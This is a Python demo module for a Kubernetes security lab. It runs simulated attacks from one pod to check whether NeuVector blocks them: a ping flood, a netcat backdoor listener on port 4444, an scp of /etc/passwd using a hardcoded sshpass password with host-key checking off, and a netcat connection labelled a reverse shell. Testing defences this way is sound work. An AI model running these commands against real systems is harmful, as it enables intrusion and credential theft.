"""Attack simulation demo - simulate various attack scenarios."""

import asyncio
from typing import Any, AsyncGenerator

from app.core.kubectl import Kubectl
from app.config import NAMESPACE
from app.demos.base import DemoModule, DemoParameter
from app.demos.registry import DemoRegistry


@DemoRegistry.register
class AttackSimulationDemo(DemoModule):
    """Demo to simulate attack scenarios (DoS, package install, file transfer, reverse shell)."""

    id = "attack"
    name = "Attack Simulation"
    description = ""
    category = "Security Testing"
    icon = "⚔️"

    @property
    def parameters(self) -> list[DemoParameter]:
        return [
            DemoParameter(
                name="pod_name",
                label="Source Pod",
                type="select",
                default="espion1",
                required=True,
                options=[
                    {"value": "espion1", "label": "Espion1"},
                    {"value": "cible1", "label": "Cible1"},
                ],
                help_text="Pod from which to run the attack simulation",
            ),
            DemoParameter(
                name="attack_type",
                label="Attack Type",
                type="select",
                default="dos_ping",
                required=True,
                options=[
                    {"value": "dos_ping", "label": "DoS Ping Flood (40KB)"},
                    {"value": "nc_backdoor", "label": "NC Backdoor (netcat listener)"},
                    {"value": "scp_transfer", "label": "File Transfer (scp)"},
                    {"value": "reverse_shell", "label": "Reverse Shell"},
                ],
                help_text="Type of attack to simulate",
            ),
            DemoParameter(
                name="target",
                label="Target",
                type="select",
                default="cible1",
                required=True,
                options=[
                    {"value": "cible1", "label": "Cible1"},
                    {"value": "external", "label": "External (example.com)"},
                ],
                help_text="Target of the attack",
            ),
        ]

    async def _resolve_target(self, kubectl: Kubectl, target: str) -> str:
        """Resolve the target address based on target selection."""
        if target == "cible1":
            # Get the pod IP for cible1
            try:
                stdout, stderr, returncode = await kubectl.run(
                    "get", "pod", "cible1",
                    "-o", "jsonpath={.status.podIP}",
                    namespace=NAMESPACE,
                    check=False,
                )
                pod_ip = stdout.strip()
                if pod_ip and returncode == 0:
                    return pod_ip
            except Exception:
                pass
            # Fallback to service DNS name
            return f"cible1.{NAMESPACE}.svc.cluster.local"
        else:
            # External target
            return "example.com"

    async def execute(
        self,
        kubectl: Kubectl,
        params: dict[str, Any],
    ) -> AsyncGenerator[str, None]:
        attack_type = params.get("attack_type", "dos_ping")
        pod_name = params.get("pod_name", "espion1")
        target = params.get("target", "cible1")

        # Get attack type label for display
        attack_labels = {
            "dos_ping": "DoS Ping Flood (40KB payload)",
            "nc_backdoor": "NC Backdoor (netcat listener)",
            "scp_transfer": "File Transfer (scp)",
            "reverse_shell": "Reverse Shell",
        }
        attack_label = attack_labels.get(attack_type, attack_type)

        yield f"[INFO] Starting attack simulation: {attack_label}"
        yield f"[INFO] Source pod: {pod_name}"
        yield f"[INFO] Target: {target}"
        yield ""

        # Resolve target address
        target_addr = await self._resolve_target(kubectl, target)
        yield f"[INFO] Resolved target address: {target_addr}"
        yield ""

        # Build command based on attack type
        if attack_type == "dos_ping":
            # DoS Ping Flood with 40KB payload
            cmd_args = ["ping", "-s", "40000", "-c", "5", target_addr]
            yield "[INFO] Simulating DoS attack with oversized ICMP packets (40KB payload)"
        elif attack_type == "nc_backdoor":
            # Netcat backdoor listener - will be blocked in Protect mode
            # Use timeout command since nc -w doesn't work reliably in listen mode
            cmd_args = ["timeout", "5", "nc", "-l", "-p", "4444"]
            yield "[INFO] Opening backdoor listener on port 4444..."
            yield "[INFO] Any attacker connecting would get shell access"
        elif attack_type == "scp_transfer":
            # File transfer of sensitive data using sshpass for non-interactive auth
            # -v for verbose output to show transfer success
            cmd_args = ["sshpass", "-p", "demo123", "scp", "-v",
                       "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
                       "/etc/passwd", f"root@{target_addr}:/tmp/"]
            yield "[INFO] Attempting to transfer sensitive file (/etc/passwd)"
        elif attack_type == "reverse_shell":
            # Reverse shell simulation: connect to SSH and get banner
            yield "[INFO] Attempting reverse shell connection to cible1..."
            yield "[INFO] This simulates connecting to a remote shell service"
            # Connect to SSH port with netcat and get the banner (first line only)
            # In Protect mode, nc will be blocked by process profile
            cmd_args = ["sh", "-c", f"nc -w 2 {target_addr} 22 </dev/null 2>/dev/null | head -1"]
            yield f"[INFO] Connecting to {target_addr}:22 via netcat"
        else:
            yield f"[ERROR] Unknown attack type: {attack_type}"
            return

        yield f"[CMD] kubectl exec {pod_name} -n {NAMESPACE} -- {' '.join(cmd_args)}"
        yield ""

        # Execute command in pod and track if process was killed
        process_killed = False
        command_success = False
        permission_denied = False
        timeout_exit = False

        try:
            async for line in kubectl.exec_in_pod(
                pod_name=pod_name,
                command=cmd_args,
                namespace=NAMESPACE,
                timeout=15,
            ):
                yield line
                # Check for various blocking/error indicators
                lower_line = line.lower()
                # Exit code 137 (SIGKILL) indicates NeuVector block
                if 'exit code 137' in lower_line:
                    process_killed = True
                # Exit code 124 indicates timeout command worked (nc ran successfully)
                if 'exit code 124' in lower_line:
                    timeout_exit = True
                # Check for permission/blocking indicators (but not SSH debug messages)
                if not lower_line.startswith('debug1:'):
                    if 'permission denied' in lower_line or 'operation not permitted' in lower_line:
                        permission_denied = True
                    if ('not found' in lower_line or 'no such file' in lower_line) and 'command' in lower_line:
                        permission_denied = True
                # Check for success indicators based on attack type
                if attack_type == "dos_ping":
                    if 'bytes from' in lower_line or 'time=' in lower_line:
                        command_success = True
                elif attack_type == "nc_backdoor":
                    # nc backdoor success if it ran without being killed
                    pass  # Will check timeout_exit after
                elif attack_type == "scp_transfer":
                    # Check for transfer success indicators
                    if 'transferred:' in lower_line or 'exit status 0' in lower_line:
                        command_success = True
                elif attack_type == "reverse_shell":
                    # nc exits cleanly if connection was made
                    pass  # Check will be done after command
        except Exception as e:
            error_str = str(e).lower()
            # Exit code 137 = SIGKILL (NeuVector Protect mode)
            if 'exit code 137' in error_str:
                process_killed = True
            # Exit code 124 = timeout command worked (process ran successfully then timed out)
            elif 'exit code 124' in error_str:
                timeout_exit = True
            # Exit code 126/127 = permission denied or command not found
            elif 'exit code 126' in error_str or 'exit code 127' in error_str:
                permission_denied = True
            else:
                yield f"[ERROR] {str(e)}"

        yield ""

        # For nc_backdoor, timeout exit means it ran successfully (not blocked)
        if attack_type == "nc_backdoor" and timeout_exit:
            yield "[INFO] Backdoor was active for 5 seconds on port 4444"
            yield "[INFO] During this time, any attacker could connect and execute commands"
            command_success = True

        # For reverse_shell, if nc ran without being killed, consider it a success
        if attack_type == "reverse_shell" and not process_killed and not permission_denied:
            command_success = True

        yield ""

        # Report results
        if process_killed:
            yield f"[OK] Attack '{attack_label}' was blocked by NeuVector!"
            yield "[INFO] Process was killed (exit code 137 - SIGKILL)"
            yield "[INFO] This indicates the process profile is in Protect mode"
        elif permission_denied:
            yield f"[OK] Attack '{attack_label}' failed - permission denied or command not found"
            yield "[INFO] This may indicate process profile blocking or missing binary"
        elif command_success:
            yield f"[WARNING] Attack '{attack_label}' succeeded!"
            yield "[INFO] Consider switching to Protect mode to block this attack"
        else:
            yield f"[INFO] Attack simulation '{attack_label}' completed"
            yield "[INFO] Check NeuVector Security Events for any violations detected"
